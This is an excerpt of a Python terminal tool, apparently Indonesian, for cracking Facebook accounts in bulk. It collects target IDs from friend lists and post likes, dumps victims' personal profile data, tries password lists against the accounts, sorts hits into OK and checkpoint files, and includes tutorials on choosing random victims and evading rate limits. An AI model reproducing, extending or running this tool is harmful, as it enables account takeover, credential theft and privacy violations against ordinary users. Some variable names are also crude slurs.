...
def menu():
    ...
    print('%s╠══[%s\x1b[0;97m3%s] %s\x1b[0;93mCrack From likes post %s'%(O,P,O,P,jid))
    print('%s╠══[%s\x1b[0;97m4%s] %s\x1b[0;93mRetrieve Target Data'%(O,P,O,P))
    print('%s╠══[%s\x1b[0;97m5%s] %s\x1b[0;93mTaking Number of Friends %s'%(O,P,O,P,pro))
    print('%s╠══[%s\x1b[0;97m6%s] %s\x1b[0;93mCheck Crack Results'%(O,P,O,P))
    print('%s╠══[%s\x1b[0;97m7%s] %s\x1b[0;93mCheck Crack Result Options %s'%(O,P,O,P,pro))
...
def publik():
    ...
    try:
        ...
        it = input("%s╠══[%s•%s] %s\x1b[0;93mID Target : "%(O,P,O,P))
        try:
...
def pengikut():
    try:
        ...
        jalan('%s╚══[%s!%s] %s\x1b[0;91mConnection Problem'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
...
def tambah_pass():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %s\x1b[0;93mFor Example :  \x1b[0;92mjeeck,123456,786786'%(O,P,O,P))
    cuy = input('%s╠══[%s•%s] %s\x1b[0;93mMasukkan Pass Tambahan Manual [1 Kata] :\x1b[0;92m '%(O,P,O,P))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
def tambah_pass_angka():
    print('%s╠══[%s•%s] %s\x1b[0;93mFor Example : \x1b[0;92m321,786,1122,123'%(O,P,O,P))
    coy = input('%s╠══[%s•%s] %s\x1b[0;93mEnter Additional Pass Behind Name : \x1b[0;92m'%(O,P,O,P))
...
class crack:
    def __init__(self,files):
        ...
        self.ko = 0
        print('%s║'%(O))
        print('%s╠══[%s•%s] %s\x1b[0;93mCrack With Password Default/Manual [d/m]'%(O,P,O,P))
        while True:
            f = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
            if f=="":
                jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                menu()
                ...
                try:
                    ...
                    print(("   %s"%e))
                    continue
                print('%s╠══[%s•%s] %s\x1b[0;93mFor example : \x1b[0;92msayang,786786,1234567123456'%(O,P,O,P))
                self.pwlist()
                break
                ...
                try:
                    ...
                    self.fl = []
                    start_methodezz()
                    kopi = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
                    if kopi in ['']:
                        jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                        menu()
                    elif kopi in ['1','01']:
                        ...
                        menu()
                    start_method()
                    put = input('%s╠══[%s•%s] %s\x1b[0;93mChoose :\x1b[0;92m '%(O,P,O,P))
                    print('%s║'%(O))
                    if put in ['']:
                        jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                        menu()
                    elif put in ['1','01','001','a']:
                        print('%s╠══[%s•%s] %s\x1b[0;93mBring Up  CP Option? [y/t]'%(O,P,O,P))
                        puf = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                            menu()
                    ...
                    print(("   %s"%e))
    def pwlist(self):
        self.pw = input('%s╠══[%s•%s] %s\x1b[0;93mEnter Password : \x1b[0;92m'%(O,P,O,P)).split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
            ...
            if put in ['']:
                ...
                print('%s╠══[%s•%s] %s\x1b[0;93mBring up CP option? [y/t]'%(O,P,O,P))
                puf = input('%s╠══[%s•%s] %s\x1b[0;92mChoose : \x1b[0;91m'%(O,P,O,P))
                if puf in ['']:
                    jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                    menu()
                elif puf in ['1','01','001','y','Y']:
...
def target():
    ...
    idt = input("%s╠══[%s•%s] %s\x1b[0;93mID Target : \x1b[0;92m"%(O,P,O,P))
    try:
    ...
    jalan('%s╠══[%s•%s] %s\x1b[0;93mNama : \x1b[0;92m%s'%(O,P,O,P,nm))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mNama Depan :\x1b[0;92m %s'%(O,P,O,P,nd))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mNama Tengah : \x1b[0;92m%s'%(O,P,O,P,nt))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mNama Belakang : \x1b[0;92m %s'%(O,P,O,P,nb))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mTTL : \x1b[0;92m%s'%(O,P,O,P,ut))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mGender : \x1b[0;92m%s'%(O,P,O,P,gd))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mEmail : \x1b[0;92m%s'%(O,P,O,P,em))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mLink : \x1b[0;92m%s'%(O,P,O,P,lk))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mUsername : \x1b[0;92m%s'%(O,P,O,P,us))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mAgama : \x1b[0;92m%s'%(O,P,O,P,rg))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mStatus Hubungan : \x1b[0;92m%s'%(O,P,O,P,rl))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mHubungan Dengan : \x1b[0;92m%s'%(O,P,O,P,rls))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mTempat Tinggal : \x1b[0;92m%s'%(O,P,O,P,lc))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mTempat Asal : \x1b[0;92m%s'%(O,P,O,P,ht))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mTentang : \x1b[0;92m%s'%(O,P,O,P,ab))
    jalan('%s╠══[%s•%s] %s\x1b[0;93mLocale : \x1b[0;92m%s'%(O,P,O,P,lo))
    print('%s║'%(O))
    input('%s╚══[ %s\x1b[0;93mReturn %s]%s'%(O,P,O,P))
    menu()
...
def teman_target():
    ...
    try:
        ...
        print ('%s╠══[%s•%s] %s\x1b[0;93mName : \x1b[0;92m%s'%(O,P,O,P,nn['name']))
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %s\x1b[0;91mToken/Cookies Invalid'%(M,P,M,P))
        menu_log()
    tt=[]
    te=[]
    lim = input('%s╠══[%s•%s] %s\x1b[0;93mLimit Dump : '%(O,P,O,P))
    print('%s║%s'%(O,P))
    ...
    for id in tt:
        try:
            ...
            try:
                ...
                print('╠══[!] \x1b[0;91mPrivate')
            print('╠══[•]',id,'•',len(te))
            te.clear()
        except KeyError:
            print('╠══[!] \x1b[0;91mSpam Accounts')
    print('║')
    input('╚══[ \x1b[0;93mReturn ]')
    menu()
def hasil():
    clear()
    banner()
    jalan('%s╔══[ %s\x1b[0;93mCrack Results %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %s\x1b[0;92mCheck Result OK'%(O,P,O,P))
    print('%s╠══[%s2%s] %s\x1b[0;93mCheck result CP'%(O,P,O,P))
    ch = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
    if ch in ['']:
        jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
        menu()
        ...
        try:
            okl = os.listdir("OK")
            print('%s║'%(O))
            print('%s╠══[%s \x1b[0;93mCrack Results Stored in File OK%s]'%(O,P,O))
            print('%s║'%(O))
            for file in okl:
                print('%s╠══[%s•%s] \x1b[0;93m%s%s'%(O,P,O,P,file))
            print('%s║'%(O))
            files = input('%s╚══[%s•%s] %s\x1b[0;93mEnter File Name : \x1b[0;92m'%(O,P,O,P))
            print('')
            if files == "":
                jalan('%s═══[%s!%s] %s\x1b[0;93mCorrect Content'%(M,P,M,P))
                hasil()
            os.system('cat OK/%s'%(files))
            ppp = open("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            print('\n%s╔══[%s•%s] %s\x1b[0;93mTotal Crack Result Date %s \x1b[0;91mis %s \x1b[0;92mAccount'%(O,P,O,P,del1,len(ppp)))
        except (KeyError,IOError):
            print('%s╠══[%s \x1b[0;91mNo Results Found %s]'%(M,P,M))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
            print('%s║'%(O))
            print('%s╠══[%s \x1b[0;93mCrack Results Stored in CP Files %s]'%(O,P,O))
            print('%s║'%(O))
            for file in cpl:
                print('%s╠══[%s•%s] \x1b[0;93m%s%s'%(O,P,O,P,file))
            print('%s║'%(O))
...
def log_hasil(user, pasw):
    ...
    if "c_user" in ses.cookies:
        print("%s[%s•%s] %s\x1b[0;92mAccount OK No Checkpointt"%(H,P,H,P))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        ...
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s[%s•%s] %s\x1b[0;92mOne Tap Account"%(H,P,H,P))
        else:
        ...
        print("%s[%s!%s] %s\x1b[0;91mPassword Has Changed"%(M,P,M,P))
def cek_hasil():
    jalan('%s╠══[ %s\x1b[0;93mCheck Crack Result Account Options %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s•%s] %s\x1b[0;93mExample File : CP/%s.txt'%(O,P,O,P,tanggal))
    files = input('%s╠══[%s•%s] %s\x1b[0;93mFile : \x1b[0;92m'%(O,P,O,P))
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        print("%s╚══[%s!%s] %sFile Not Existing"%(M,P,M,P))
        time.sleep(2); cek_hasil()
    print("%s╚══[%s•%s] %s\x1b[0;93mNumber of Accounts : %s"%(O,P,O,P,str(len(buka_baju))))
    print("")
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("•")
        print("%s[%s•%s] %s\x1b[0;93mCheck Login : %s"%(O,P,O,P,kontol))
        try:
        ...
        print("")
    print("")
    print('%s╔══[%s•%s] %s \x1b[0;92mChecking Process Complete'%(O,P,O,P))
    print('%s║'%(O))
    input('%s╚══[ %s\x1b[0;93mReturn %s]%s'%(O,P,O,P))
    menu()
def var_menu():
    print('%s╔══[ %s\x1b[0;92mSelect Method Login %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %s\x1b[0;93mLogin with Token'%(O,P,O,P))
    print('%s╠══[%s2%s] %s\x1b[0;93mLogin with Cookies'%(O,P,O,P))
    print('%s╠══[%s3%s] %s\x1b[0;93mScript Usage Tutorial'%(O,P,O,P))
    print('%s╠══[%s0%s] %s\x1b[0;91mGo Back'%(O,P,O,P))
def var_tutor():
    mlaku('%s╔══[%s \x1b[0;92mTipsnya & Tutorial %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %s\x1b[0;93mHow to Take Token'%(O,P,O,P))
    print('%s╠══[%s2%s] %s\x1b[0;93m\x1b[0;93mHow to Take Cookies'%(O,P,O,P))
    print('%s╠══[%s3%s] %s\x1b[0;93mHow to Get Target'%(O,P,O,P))
    print('%s╠══[%s4%s] %s\x1b[0;93mWays During the Crack Process'%(O,P,O,P))
def tutor_target():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %s\x1b[0;92mPrepare a Sacrificial Account In Chrome For Cracking Process %s║'%(O,P,O,P,O))
    mlaku('%s║ %s2 %s║ %s\x1b[0;92mChange the Victim Account Password First          %s║'%(O,P,O,P,O))
    mlaku('%s║ %s3 %s║ %s\x1b[0;92mFind Random Account Targets, Friends List Must Be Public   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s4 %s║ %s\x1b[0;92mFriends (FL) Free, Can be 1K, 2K, 3K, ,4K, Or 5K      %s║'%(O,P,O,P,O))
    mlaku('%s║ %s5 %s║ %s\x1b[0;92mMore Friends, More Possible Results  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s6 %s║ %s\x1b[0;92mTap Target Profile/Cover Photo                      %s║'%(O,P,O,P,O))
    mlaku('%s║ %s7 %s║ %s\x1b[0;92msee URL/Link Above, There is \ id = 10001xx\ %s║'%(O,P,O,P,O))
    mlaku('%s║ %s8 %s║ %s\x1b[0;92mWell, thats a target ID ready to crack   %s║'%(O,P,O,P,O))
    mlaku('%s║ %s9 %s║ %s\x1b[0;92mOpen Termux/Linux then proceed to the Crack Process %s║'%(O,P,O,P,O))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(O))
def tutor_crack():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %s\x1b[0;93mMethod Api : \x1b[0;92mSafs But Easy Process Spam            %s║'%(O,P,O,P,O))
    mlaku('%s║ %s2 %s║ %s\x1b[0;93mMethod Mbasic : \x1b[0;92mThati process is quite fast, rarely spammed  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s3 %s║ %s\x1b[0;93mMethod Mobile : \x1b[0;92mSlow Process, Probably OK  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s4 %s║ %s\x1b[0;93mCrack Using Data Quota (Not Support Wifi)  %s║'%(O,P,O,P,O))
    mlaku('%s║ %s5 %s║ %s\x1b[0;93mIf Results Do Not Appear While The Crack Is Running       %s║'%(O,P,O,P,O))
    mlaku('%s║ %s6 %s║ %s\x1b[0;93mTurn On Airplane Mode Only 5 Seconds                   %s║'%(O,P,O,P,O))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(O))
def var_ugen():
    print("%s╠══[%s1%s] %s\x1b[0;93mGet User Agent"%(O,P,O,P))
    print("%s╠══[%s2%s] %s\x1b[0;93mChange User Agent%s(%sManual%s)"%(O,P,O,P,O,P,O))
    print("%s╠══[%s3%s] %s\x1b[0;93mChange User Agent %s(%sAdjust HP%s)"%(O,P,O,P,O,P,O))
    print("%s╠══[%s4%s] %s\x1b[0;93mDelete User Agent"%(O,P,O,P))
    print("%s╠══[%s5%s] %s\x1b[0;93mCheck User Agent"%(O,P,O,P))
    print("%s╠══[%s0%s] %s\x1b[0;91mReturn"%(O,P,O,P))
def start_method():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %s\x1b[0;93mMethod Api'%(O,P,O,P))
    print('%s╠══[%s2%s] %s\x1b[0;92mMethod Mbasic'%(O,P,O,P))
    print('%s╠══[%s3%s] %s\x1b[0;91mMethod Free FB'%(O,P,O,P))
def start_methodezz():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %s\x1b[0;93mFast Crack %s[%s6 pass%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s2%s] %s\x1b[0;92mSlow Crack %s[%s9 pass%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s3%s] %s\x1b[0;91mVery Slow Crack %s[%s12 pass%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s4%s] %s\x1b[0;97mCrack Password Combine'%(O,P,O,P))
def started():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sCrack sedang berjalan...'%(O,P,O,P))
    print('%s╠══[%s•%s] %s\x1b[0;92mAccount [OK] Saved To OK/%s.txt'%(O,P,O,P,tanggal))
    print('%s╠══[%s•%s] %s\x1b[0;93mAccount [CP] Saved To CP/%s.txt'%(O,P,O,P,tanggal))
